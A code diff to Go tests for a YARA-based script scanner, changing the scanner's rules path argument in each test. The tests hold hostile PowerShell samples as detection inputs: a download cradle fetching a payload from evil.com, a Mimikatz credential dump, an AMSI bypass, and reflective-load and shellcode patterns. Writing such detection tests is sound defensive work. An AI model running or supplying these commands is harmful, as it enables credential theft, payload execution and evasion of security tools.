@@ -11,7 +11,7 @@ import (
 // ── Task C: ScanScript tests ─────────────────────────────────────────────────
 
 func TestScanScriptInvokeExpression(t *testing.T) {
-	scanner, _ := rules.NewYaraScanner(".")
+	scanner, _ := rules.NewYaraScanner("")
 	content := []byte(`Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.com/pay.ps1")`)
 
 	hits := scanner.ScanScript(content, "test:iex")
@@ -33,7 +33,7 @@ func TestScanScriptInvokeExpression(t *testing.T) {
 }
 
 func TestScanScriptMimikatz(t *testing.T) {
-	scanner, _ := rules.NewYaraScanner(".")
+	scanner, _ := rules.NewYaraScanner("")
 	content := []byte(`Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'`)
 
 	hits := scanner.ScanScript(content, "test:mimikatz")
@@ -53,7 +53,7 @@ func TestScanScriptMimikatz(t *testing.T) {
 }
 
 func TestScanScriptAMSIBypass(t *testing.T) {
-	scanner, _ := rules.NewYaraScanner(".")
+	scanner, _ := rules.NewYaraScanner("")
 	// Classic amsiInitFailed bypass
 	content := []byte(`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`)
 
@@ -74,7 +74,7 @@ func TestScanScriptAMSIBypass(t *testing.T) {
 }
 
 func TestScanScriptHighEntropy(t *testing.T) {
-	scanner, _ := rules.NewYaraScanner(".")
+	scanner, _ := rules.NewYaraScanner("")
 	// High-variance byte slice → high Shannon entropy (> 5.5)
 	data := make([]byte, 512)
 	for i := range data {
@@ -98,7 +98,7 @@ func TestScanScriptHighEntropy(t *testing.T) {
 }
 
 func TestScanScriptEmpty(t *testing.T) {
-	scanner, _ := rules.NewYaraScanner(".")
+	scanner, _ := rules.NewYaraScanner("")
 	hits := scanner.ScanScript([]byte{}, "test:empty")
 	if len(hits) != 0 {
 		t.Errorf("expected 0 hits for empty content, got %d", len(hits))
@@ -106,7 +106,7 @@ func TestScanScriptEmpty(t *testing.T) {
 }
 
 func TestScanScriptReflectiveLoad(t *testing.T) {
-	scanner, _ := rules.NewYaraScanner(".")
+	scanner, _ := rules.NewYaraScanner("")
 	content := []byte(`$b = [System.IO.File]::ReadAllBytes("x.dll"); [System.Reflection.Assembly]::Load($b)`)
 
 	hits := scanner.ScanScript(content, "test:reflective-load")
@@ -126,7 +126,7 @@ func TestScanScriptReflectiveLoad(t *testing.T) {
 }
 
 func TestScanScriptVirtualAlloc(t *testing.T) {
-	scanner, _ := rules.NewYaraScanner(".")
+	scanner, _ := rules.NewYaraScanner("")
 	content := []byte(`$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4096); VirtualAlloc $mem 4096`)
 
 	hits := scanner.ScanScript(content, "test:shellcode")
